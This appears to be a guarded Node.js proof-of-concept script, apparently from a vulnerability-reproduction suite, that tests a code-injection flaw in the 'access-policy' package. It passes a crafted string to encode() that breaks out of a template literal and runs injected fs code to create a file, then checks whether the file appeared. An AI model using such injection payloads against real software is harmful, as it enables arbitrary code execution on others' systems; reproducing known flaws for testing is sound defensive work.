if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
let a = require("access-policy");
const path = "./access-policy";
let statements = "`; require(`fs`).writeFileSync(`" + path + "`,``);//";
data = {};
file_exist = fs.existsSync(path);
console.log("a", file_exist);
try {
	a.encode(statements, data);
} catch (e) {}
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
